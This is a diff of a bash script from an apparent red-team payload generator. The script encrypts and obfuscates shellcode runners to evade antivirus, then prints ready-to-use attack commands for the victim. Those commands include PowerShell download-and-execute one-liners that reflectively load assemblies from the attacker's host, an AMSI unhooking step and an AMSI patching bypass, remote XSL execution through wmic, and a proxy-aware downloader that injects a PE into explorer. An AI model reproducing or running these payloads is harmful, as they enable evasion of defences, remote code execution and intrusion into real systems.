@@ -125,14 +125,7 @@ python add_code2.py
 
 echo "[+] Creating ASPX file (Non-Encrypted) ..."
 echo "[+] Unhooking AMSI ..."
-echo " [*] Upload unhook_amsi.exe and MinHook.NET.dll to the victim "
-echo " [*] Files are unders: payloads/AMSI/"
-echo " [*] Execution: unhook_amsi.exe http://<KALI>/shellcode_runner.exe "
-
 echo "[+] Generating a 3DES Shellcode Runner ..."
-echo " [*] Execution of 3DES ..."
-echo " [1] Example: des_decryptor.exe \"http://<KALI>/shellcode_runner_assembly_3des.exe\""
-echo " [2] Example: des_decryptor_embeded.exe"
 pwsh -c ". ./Templates/3DES/TripleDESEncryptor.ps1;TripleDESEncryption -Password oqphnbt0kuedizy4m3avx6r5lf21jc8s -Salt vh9b4tsxrl1560wg8nda2meuc7yjzop3 -File 'payloads/XOR/shellcode_runner_assembly.exe' -EncryptedBinaryFile 'payloads/3DES/shellcode_runner_assembly_3des.exe'" &>/dev/null
 pwsh -c ". ./Templates/3DES/TripleDESEncryptor.ps1;TripleDESEncryption -Password oqphnbt0kuedizy4m3avx6r5lf21jc8s -Salt vh9b4tsxrl1560wg8nda2meuc7yjzop3 -File 'payloads/XOR/shellcode_runner_assembly_numa_marshal.exe' -EncryptedBinaryFile 'payloads/3DES/shellcode_runner_assembly_numa_marshal_3des.exe'" &>/dev/null
 pwsh -c "\$bytes = [System.IO.File]::ReadAllBytes(\"payloads/3DES/shellcode_runner_assembly_3des.exe\");\$EncodedText = [Convert]::ToBase64String(\$bytes);\$encodedText > payloads/3DES/shellcode_runner_b64.txt"
@@ -150,135 +143,145 @@ cp Templates/3DES/des_decryptor.exe payloads/3DES/des_decryptor.exe
 
 echo "[+] Creating DLL/EXE file (ConfuserEx + .NET Obfuscator) ..."
 echo ""
-echo " [!] Obfuscating CAESAR -> shellcode_runner_assembly_numa.exe"
-#mono $CONFUSER $PAYLOADS/Caesar/shellcode_runner_assembly.exe -o $OUTPUT_CAESAR_DIR &>/dev/null
 mono $CONFUSER $PAYLOADS/Caesar/shellcode_runner_assembly_numa.exe -o $OUTPUT_CAESAR_DIR &>/dev/null
 OBFUSCATED=`mono $NET_OBFUSCATOR --in-file $OUTPUT_CAESAR_DIR/shellcode_runner_assembly_numa.exe`
 CLASS=`echo $OBFUSCATED |grep -oP '(?<=NonEmulated -> ).\w+'`
 PROGRAM=`echo $OBFUSCATED |grep -oP '(?<=Program -> ).\w+'`
 MAIN=`echo $OBFUSCATED |grep -oP '(?<=Main -> ).\w+'`
-echo " [*] PS>\$data=(New-Object System.Net.WebClient).DownloadData('http://192.168.119.120/shellcode_runner.exe|dll')"
-echo " [*] PS>\$ass=[System.Reflection.Assembly]::Load(\$data)"
-echo " [*] PS>\$ass.GetType(\"${CLASS}.${PROGRAM}\").GetMethod(\"${MAIN}\").Invoke(\$null,\$null)"
-echo "/*--------------------------------------------------------------------*/"
-echo " [!] Obfuscating CAESAR -> shellcode_runner_assembly_numa_marshal.exe"
+
+echo " _____________________________________________________________________________________________________________________________________"
+echo "|                                                     Unhooking AMSI                                                                  |"
+echo "|-------------------------------------------------------------------------------------------------------------------------------------|"
+echo "| [1] Upload unhook_amsi.exe and MinHook.NET.dll to the victim                                                                        |"
+echo "| [2] Execution: unhook_amsi.exe http://"${LHOST}"/shellcode_runner.exe                                                          |"
+echo "|_____________________________________________________________________________________________________________________________________|"
+echo ""
+echo " _____________________________________________________________________________________________________________________________________"
+echo "|                                                     Triple DES Execution                                                            |"
+echo "|-------------------------------------------------------------------------------------------------------------------------------------|"
+echo "| [1] Example: des_decryptor.exe \"http://"${LHOST}"/des_decryptor_embedded.exe\"                                                  |"
+echo "| [2] Example: des_decryptor.exe \"http://"${LHOST}"/des_decryptor_embedded_marshal.exe\"                                          |"
+echo "| [3] Example: des_decryptor_embeded.exe                                                                                              |"
+echo "| [4] Example: des_decryptor_embedded_marshal.exe                                                                                     |"
+echo "|_____________________________________________________________________________________________________________________________________|"
+echo ""
+
 mono $CONFUSER $PAYLOADS/Caesar/shellcode_runner_assembly_numa_marshal.exe -o $OUTPUT_CAESAR_DIR &>/dev/null
 OBFUSCATED=`mono $NET_OBFUSCATOR --in-file $OUTPUT_CAESAR_DIR/shellcode_runner_assembly_numa_marshal.exe`
 CLASS=`echo $OBFUSCATED |grep -oP '(?<=NonEmulated -> ).\w+'`
 PROGRAM=`echo $OBFUSCATED |grep -oP '(?<=Program -> ).\w+'`
 MAIN=`echo $OBFUSCATED |grep -oP '(?<=Main -> ).\w+'`
-echo " [*] PS>\$data=(New-Object System.Net.WebClient).DownloadData('http://192.168.119.120/shellcode_runner.exe|dll')"
-echo " [*] PS>\$ass=[System.Reflection.Assembly]::Load(\$data)"
-echo " [*] PS>\$ass.GetType(\"${CLASS}.${PROGRAM}\").GetMethod(\"${MAIN}\").Invoke(\$null,\$null)"
-echo "/*--------------------------------------------------------------------*/"
-#mono $CONFUSER $PAYLOADS/Caesar/shellcode_runner_assembly_FlsAlloc_marshal.exe -o $OUTPUT_CAESAR_DIR &>/dev/null
-#mono $CONFUSER $PAYLOADS/Caesar/shellcode_runner_assembly.dll -o $OUTPUT_CAESAR_DIR &>/dev/null
-echo " [!] Obfuscating CAESAR -> shellcode_runner_assembly_numa.dll"
+echo " _____________________________________________________________________________________________________________________________________"
+echo "|                                          ConfuserEx  +  Net-Obfuscate Execution                                                     |"
+echo "|-------------------------------------------------------------------------------------------------------------------------------------|"
+echo "| [*] Obfusacating 'Caesar' encrypted Shellcode Runner: shellcode_runner_assembly_numa.exe                                            |"
+echo "|                                                                                                                                     |"
+echo "| PS>\$data=(New-Object System.Net.WebClient).DownloadData('http://"${LHOST}"/shellcode_runner_assembly_numa.exe')                |"
+echo "| PS>\$ass=[System.Reflection.Assembly]::Load(\$data)                                                                                   |"
+echo "| PS>\$ass.GetType(\"${CLASS}.${PROGRAM}\").GetMethod(\"${MAIN}\").Invoke(\$null,\$null)                                                |"
+echo "|-------------------------------------------------------------------------------------------------------------------------------------|"
+echo "| [*] Obfusacating 'Caesar' encrypted Shellcode Runner: shellcode_runner_assembly_numa_marshal.exe                                    |"
+echo "|                                                                                                                                     |"
+echo "| PS>\$data=(New-Object System.Net.WebClient).DownloadData('http://"${LHOST}"/shellcode_runner_assembly_numa_marshal.exe')        |"
+echo "| PS>\$ass=[System.Reflection.Assembly]::Load(\$data)                                                                                  |"
+echo "| PS>\$ass.GetType(\"${CLASS}.${PROGRAM}\").GetMethod(\"${MAIN}\").Invoke(\$null,\$null)                                                |"
+echo "|-------------------------------------------------------------------------------------------------------------------------------------|"
+echo "| [*] Obfusacating 'Caesar' encrypted Shellcode Runner: shellcode_runner_assembly_numa.dll                                            |"
 mono $CONFUSER $PAYLOADS/Caesar/shellcode_runner_assembly_numa.dll -o $OUTPUT_CAESAR_DIR &>/dev/null
 OBFUSCATED=`mono $NET_OBFUSCATOR --in-file $OUTPUT_CAESAR_DIR/shellcode_runner_assembly_numa.dll`
 CLASS=`echo $OBFUSCATED |grep -oP '(?<=NonEmulated -> ).\w+'`
 PROGRAM=`echo $OBFUSCATED |grep -oP '(?<=Program -> ).\w+'`
 MAIN=`echo $OBFUSCATED |grep -oP '(?<=Main -> ).\w+'`
-echo " [*] PS>\$data=(New-Object System.Net.WebClient).DownloadData('http://192.168.119.120/shellcode_runner.exe|dll')"
-echo " [*] PS>\$ass=[System.Reflection.Assembly]::Load(\$data)"
-echo " [*] PS>\$ass.GetType(\"${CLASS}.${PROGRAM}\").GetMethod(\"${MAIN}\").Invoke(\$null,\$null)"
-echo "/*--------------------------------------------------------------------*/"
-echo " [!] Obfuscating CAESAR -> shellcode_runner_assembly_numa_marshal.dll"
+echo "|                                                                                                                                     |"
+echo "| PS>\$data=(New-Object System.Net.WebClient).DownloadData('http://"${LHOST}"/shellcode_runner_assembly_numa.dll')                 |"
+echo "| PS>\$ass=[System.Reflection.Assembly]::Load(\$data)                                                                                   |"
+echo "| PS>\$ass.GetType(\"${CLASS}.${PROGRAM}\").GetMethod(\"${MAIN}\").Invoke(\$null,\$null)                                                |"
+echo "|-------------------------------------------------------------------------------------------------------------------------------------|"
+echo "| [*] Obfusacating 'Caesar' encrypted Shellcode Runner: shellcode_runner_assembly_numa_marshal.dll                                    |"
 mono $CONFUSER $PAYLOADS/Caesar/shellcode_runner_assembly_numa_marshal.dll -o $OUTPUT_CAESAR_DIR &>/dev/null
 OBFUSCATED=`mono $NET_OBFUSCATOR --in-file $OUTPUT_CAESAR_DIR/shellcode_runner_assembly_numa_marshal.dll`
 CLASS=`echo $OBFUSCATED |grep -oP '(?<=NonEmulated -> ).\w+'`
 PROGRAM=`echo $OBFUSCATED |grep -oP '(?<=Program -> ).\w+'`
 MAIN=`echo $OBFUSCATED |grep -oP '(?<=Main -> ).\w+'`
-echo " [*] PS>\$data=(New-Object System.Net.WebClient).DownloadData('http://192.168.119.120/shellcode_runner.exe|dll')"
-echo " [*] PS>\$ass=[System.Reflection.Assembly]::Load(\$data)"
-echo " [*] PS>\$ass.GetType(\"${CLASS}.${PROGRAM}\").GetMethod(\"${MAIN}\").Invoke(\$null,\$null)"
-echo "/*--------------------------------------------------------------------*/"
-#mono $CONFUSER $PAYLOADS/Caesar/shellcode_runner_assembly_FlsAlloc_marshal.dll -o $OUTPUT_CAESAR_DIR &>/dev/null
-#mono $CONFUSER $PAYLOADS/XOR/shellcode_runner_assembly.exe -o $OUTPUT_XOR_DIR &>/dev/null
-echo " [!] Obfuscating XOR -> shellcode_runner_assembly_numa.exe"
+echo "|                                                                                                                                     |"
+echo "| PS>\$data=(New-Object System.Net.WebClient).DownloadData('http://"${LHOST}"/shellcode_runner_assembly_numa_marshal.dll')         |"
+echo "| PS>\$ass=[System.Reflection.Assembly]::Load(\$data)                                                                               	|"
+echo "| PS>\$ass.GetType(\"${CLASS}.${PROGRAM}\").GetMethod(\"${MAIN}\").Invoke(\$null,\$null)                                                |"
+echo "|-------------------------------------------------------------------------------------------------------------------------------------|"
+echo "| [*] Obfusacating 'XOR' encrypted Shellcode Runner: shellcode_runner_assembly_numa.exe                                               |"
 mono $CONFUSER $PAYLOADS/XOR/shellcode_runner_assembly_numa.exe -o $OUTPUT_XOR_DIR &>/dev/null
 OBFUSCATED=`mono $NET_OBFUSCATOR --in-file $OUTPUT_XOR_DIR/shellcode_runner_assembly_numa.exe`
 CLASS=`echo $OBFUSCATED |grep -oP '(?<=NonEmulated -> ).\w+'`
 PROGRAM=`echo $OBFUSCATED |grep -oP '(?<=Program -> ).\w+'`
 MAIN=`echo $OBFUSCATED |grep -oP '(?<=Main -> ).\w+'`
-echo " [*] PS>\$data=(New-Object System.Net.WebClient).DownloadData('http://192.168.119.120/shellcode_runner.exe|dll')"
-echo " [*] PS>\$ass=[System.Reflection.Assembly]::Load(\$data)"
-echo " [*] PS>\$ass.GetType(\"${CLASS}.${PROGRAM}\").GetMethod(\"${MAIN}\").Invoke(\$null,\$null)" 
-echo "/*--------------------------------------------------------------------*/"
-echo " [!] Obfuscating XOR -> shellcode_runner_assembly_numa_marshal.exe"
+echo "|                                                                                                                                     |"
+echo "| PS>\$data=(New-Object System.Net.WebClient).DownloadData('http://"${LHOST}"/shellcode_runner_assembly_numa.exe')                |"
+echo "| PS>\$ass=[System.Reflection.Assembly]::Load(\$data)                                                                                   |"
+echo "| PS>\$ass.GetType(\"${CLASS}.${PROGRAM}\").GetMethod(\"${MAIN}\").Invoke(\$null,\$null)                                                |"
+echo "|-------------------------------------------------------------------------------------------------------------------------------------|"
+echo "| [*] Obfusacating 'XOR' encrypted Shellcode Runner: shellcode_runner_assembly_numa_marshal.exe                                       |"
 mono $CONFUSER $PAYLOADS/XOR/shellcode_runner_assembly_numa_marshal.exe -o $OUTPUT_XOR_DIR &>/dev/null
 OBFUSCATED=`mono $NET_OBFUSCATOR --in-file $OUTPUT_XOR_DIR/shellcode_runner_assembly_numa_marshal.exe`
 CLASS=`echo $OBFUSCATED |grep -oP '(?<=NonEmulated -> ).\w+'`
 PROGRAM=`echo $OBFUSCATED |grep -oP '(?<=Program -> ).\w+'`
 MAIN=`echo $OBFUSCATED |grep -oP '(?<=Main -> ).\w+'`
-echo " [*] PS>\$data=(New-Object System.Net.WebClient).DownloadData('http://192.168.119.120/shellcode_runner.exe|dll')"
-echo " [*] PS>\$ass=[System.Reflection.Assembly]::Load(\$data)"
-echo " [*] PS>\$ass.GetType(\"${CLASS}.${PROGRAM}\").GetMethod(\"${MAIN}\").Invoke(\$null,\$null)"
-echo "/*--------------------------------------------------------------------*/"
-#mono $CONFUSER $PAYLOADS/XOR/shellcode_runner_assembly_FlsAlloc_marshal.exe -o $OUTPUT_XOR_DIR &>/dev/null
-#mono $CONFUSER $PAYLOADS/XOR/shellcode_runner_assembly.dll -o $OUTPUT_XOR_DIR &>/dev/null
-echo " [!] Obfuscating XOR -> shellcode_runner_assembly_numa.dll"
+echo "|                                                                                                                                     |"
+echo "| PS>\$data=(New-Object System.Net.WebClient).DownloadData('http://"${LHOST}"/shellcode_runner_assembly_numa_marshal.exe')        |"
+echo "| PS>\$ass=[System.Reflection.Assembly]::Load(\$data)                                                                                   |"
+echo "| PS>\$ass.GetType(\"${CLASS}.${PROGRAM}\").GetMethod(\"${MAIN}\").Invoke(\$null,\$null)                                                |"
+echo "|-------------------------------------------------------------------------------------------------------------------------------------|"
+echo "| [*] Obfusacating 'XOR' encrypted Shellcode Runner: shellcode_runner_assembly_numa.dll                                               |"
 mono $CONFUSER $PAYLOADS/XOR/shellcode_runner_assembly_numa.dll -o $OUTPUT_XOR_DIR &>/dev/null
 OBFUSCATED=`mono $NET_OBFUSCATOR --in-file $OUTPUT_XOR_DIR/shellcode_runner_assembly_numa.dll`
 CLASS=`echo $OBFUSCATED |grep -oP '(?<=NonEmulated -> ).\w+'`
 PROGRAM=`echo $OBFUSCATED |grep -oP '(?<=Program -> ).\w+'`
 MAIN=`echo $OBFUSCATED |grep -oP '(?<=Main -> ).\w+'`
-echo " [*] PS>\$data=(New-Object System.Net.WebClient).DownloadData('http://192.168.119.120/shellcode_runner.exe|dll')"
-echo " [*] PS>\$ass=[System.Reflection.Assembly]::Load(\$data)"
-echo " [*] PS>\$ass.GetType(\"${CLASS}.${PROGRAM}\").GetMethod(\"${MAIN}\").Invoke(\$null,\$null)"
-echo "/*--------------------------------------------------------------------*/"
-echo " [!] Obfuscating XOR -> shellcode_runner_assembly_numa_marshal.dll"
+echo "|                                                                                                                                     |"
+echo "| PS>\$data=(New-Object System.Net.WebClient).DownloadData('http://"${LHOST}"/shellcode_runner_assembly_numa.dll')               |"
+echo "| PS>\$ass=[System.Reflection.Assembly]::Load(\$data)                                                                                   |"
+echo "| PS>\$ass.GetType(\"${CLASS}.${PROGRAM}\").GetMethod(\"${MAIN}\").Invoke(\$null,\$null)                                                |"
+echo "|-------------------------------------------------------------------------------------------------------------------------------------|"
+echo "| [*] Obfusacating 'XOR' encrypted Shellcode Runner: shellcode_runner_assembly_numa_marshal.dll                                       |"
 mono $CONFUSER $PAYLOADS/XOR/shellcode_runner_assembly_numa_marshal.dll -o $OUTPUT_XOR_DIR &>/dev/null
 OBFUSCATED=`mono $NET_OBFUSCATOR --in-file $OUTPUT_XOR_DIR/shellcode_runner_assembly_numa_marshal.dll`
 CLASS=`echo $OBFUSCATED |grep -oP '(?<=NonEmulated -> ).\w+'`
 PROGRAM=`echo $OBFUSCATED |grep -oP '(?<=Program -> ).\w+'`
 MAIN=`echo $OBFUSCATED |grep -oP '(?<=Main -> ).\w+'`
-echo " [*] PS>\$data=(New-Object System.Net.WebClient).DownloadData('http://192.168.119.120/shellcode_runner.exe|dll')"
-echo " [*] PS>\$ass=[System.Reflection.Assembly]::Load(\$data)"
-echo " [*] PS>\$ass.GetType(\"${CLASS}.${PROGRAM}\").GetMethod(\"${MAIN}\").Invoke(\$null,\$null)"
-echo "/*--------------------------------------------------------------------*/"
-#mono $CONFUSER $PAYLOADS/XOR/shellcode_runner_assembly_FlsAlloc_marshal.dll -o $OUTPUT_XOR_DIR &>/dev/null
+echo "|                                                                                                                                     |"
+echo "| PS>\$data=(New-Object System.Net.WebClient).DownloadData('http://"${LHOST}"/shellcode_runner_assembly_numa_marshal.dll')       |"
+echo "| PS>\$ass=[System.Reflection.Assembly]::Load(\$data)                                                                                   |"
+echo "| PS>\$ass.GetType(\"${CLASS}.${PROGRAM}\").GetMethod(\"${MAIN}\").Invoke(\$null,\$null)                                                |"
+echo "|_____________________________________________________________________________________________________________________________________|"
 
 echo ""
-echo ""
-echo "/*------------------------------------.NET ASSEMBLY EXECUTION---------------------------------------------------------*/"
-# Execution of DLL/EXE
-echo ""
-echo "[+] Assembly - Local Execution or via SMB [+]"
-echo "\$data=[IO.File]::ReadAllBytes('shellcode_runner.exe|dll')"
-echo "\$ass=[System.Reflection.Assembly]::Load(\$data)"
-echo "\$ass.GetType(\"Runner.TestClass\").GetMethod(\"Main\").Invoke(\$null,@(,\$null))"
+echo " _____________________________________________________________________________________________________________________________________"
+echo "|                                                .NET ASSEMBLY EXECUTION                                                              |"
+echo "|-------------------------------------------------------------------------------------------------------------------------------------|"
+echo "| [+] Assembly - Local Execution or via SMB [+]                                                                                       |"
+echo "| \$data=[IO.File]::ReadAllBytes('shellcode_runner.exe|dll')                                                                          |"
+echo "| \$ass=[System.Reflection.Assembly]::Load(\$data)                                                                                    |"
+echo "| \$ass.GetType(\"Runner.TestClass\").GetMethod(\"Main\").Invoke(\$null,@(,\$null))                                                   |"
+echo "|-------------------------------------------------------------------------------------------------------------------------------------|"
+echo "| [+] Assembly - Remote Execution  [+]                                                                                                |"
+echo "| \$data=(New-Object System.Net.WebClient).DownloadData('http://"${LHOST}"/shellcode_runner.exe|dll')                                 |"
+echo "| \$ass=[System.Reflection.Assembly]::Load(\$data)                                                                                    |"
+echo "| \$ass.GetType(\"Runner.TestClass\").GetMethod(\"Main\").Invoke(\$null,@(,\$null))                                                   |"
+echo "|_____________________________________________________________________________________________________________________________________|"
 
 echo ""
-echo "[+] Assembly - Remote Execution  [+]"
-echo "\$data=(New-Object System.Net.WebClient).DownloadData('http://192.168.119.120/shellcode_runner.exe|dll')"
-echo "\$ass=[System.Reflection.Assembly]::Load(\$data)"
-echo "\$ass.GetType(\"Runner.TestClass\").GetMethod(\"Main\").Invoke(\$null,@(,\$null))"
-
+echo " _____________________________________________________________________________________________________________________________________"
+echo "| [+] XSL execution [+]                                                                                                               |"
+echo "| wmic process list /FORMAT:shellcode_runner.xsl                                                                                       "
+echo "| wmic os get /FORMAT:\"http://"${LHOST}"/shellcode_runner.xsl\"                                                                       "
+echo "|_____________________________________________________________________________________________________________________________________|"
 echo ""
-echo "[+] XSL execution [+]"
-echo "wmic process list /FORMAT:evil.xsl"
-echo "wmic os get /FORMAT:\"https://example.com/evil.xsl\""
+echo " _____________________________________________________________________________________________________________________________________"
+echo "|                                             PowerShell DownloadString                                                               |"
+echo "|-------------------------------------------------------------------------------------------------------------------------------------|"
+echo "| [+] AMSI bypass [+]                                                                                                                  "
+echo "| powershell -nop -exec bypass -c IEX((New-Object Net.WebClient).DownloadString('http://"${LHOST}"/shellcode_runner.html'));           "
+echo "|_____________________________________________________________________________________________________________________________________|"
 
-echo ""
-echo "[+] TXT execution - AMSI bypass [+]"
-echo "powershell -nop -exec bypass -c IEX((New-Object Net.WebClient).DownloadString('http://<IP>/shellcode_runner.txt'));"
-
-
-echo ""
-echo "[+] Proxy Aware Downloader [+]"
-echo "powershell -nop -exec bypass -c \"\$proxyAddr=(Get-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings' | Select-Object ProxyServer).ProxyServer;[system.net.webrequest]::DefaultWebProxy = new-object System.Net.WebProxy(\"http://\$proxyAddr\");\$webclient=(New-Object System.Net.WebClient);\$userAgent=(Get-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings').'User Agent';\$webClient.Headers.Add(\"User-Agent\", \$userAgent);\$webClient.Proxy=[System.Net.WebRequest]::DefaultWebProxy;\$webClient.Proxy.Credentials=[System.Net.CredentialCache]::DefaultNetworkCredentials;\$bytes=\$webclient.DownloadData('http://192.168.49.136/shellcode_runner_assembly.exe');\$webclient.DownloadString('http://192.168.49.136/Invoke-ReflectivePEInjection.ps1')|IEX;\$procid=(Get-Process -Name explorer).Id;Invoke-ReflectivePEInjection -PEBytes \$bytes -ProcId \$procid\""
-echo ""
-echo "powershell -nop -exec bypass -c \"\$proxyAddr=(Get-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings' | Select-Object ProxyServer).ProxyServer;[system.net.webrequest]::DefaultWebProxy = new-object System.Net.WebProxy(\"http://\$proxyAddr\");\$webclient=(New-Object System.Net.WebClient);\$userAgent=(Get-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings').'User Agent';\$webClient.Headers.Add(\"User-Agent\", \$userAgent);\$webClient.Proxy=[System.Net.WebRequest]::DefaultWebProxy;\$webClient.Proxy.Credentials=[System.Net.CredentialCache]::DefaultNetworkCredentials;\$bytes=\$webclient.DownloadString('http://192.168.49.162/shellcode_runner.txt')|IEX;\""
-
-echo ""
-echo "[+] AMSI + Proxy Aware - One liner [+]"
-echo "powershell -nop -exec bypass -c \"\$a=[Ref].Assembly.GetTypes();Foreach(\$b in \$a) {if (\$b.Name -like \"*iUtils\"){\$c=\$b}};\$d=\$c.GetFields('NonPublic,Static');Foreach(\$e in \$d) {if (\$e.Name -like \"*Context\") {\$f=\$e}};\$g=\$f.GetValue(\$null);[IntPtr]\$ptr=\$g;[Int32[]]\$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy(\$buf, 0, \$ptr, 1);\$proxyAddr=(Get-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings' | Select-Object ProxyServer).ProxyServer;[system.net.webrequest]::DefaultWebProxy = new-object System.Net.WebProxy(\"http://\$proxyAddr\");\$webclient=(New-Object System.Net.WebClient);\$userAgent=(Get-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings').'User Agent';\$webClient.Headers.Add(\"User-Agent\", \$userAgent);\$webClient.Proxy=[System.Net.WebRequest]::DefaultWebProxy;\$webClient.Proxy.Credentials=[System.Net.CredentialCache]::DefaultNetworkCredentials;\$bytes=\$webclient.DownloadString('http://192.168.49.162/shellcode_runner.txt')|IEX;\""
 # Delete Files
 rm shellcode.txt
 
-##Compile to Executable
-#mcs shellcode_runner.cs
-
-##Complile to DLL
-#mcs -target:library -out:ProcessInjection.dll shellcode_runner.cs
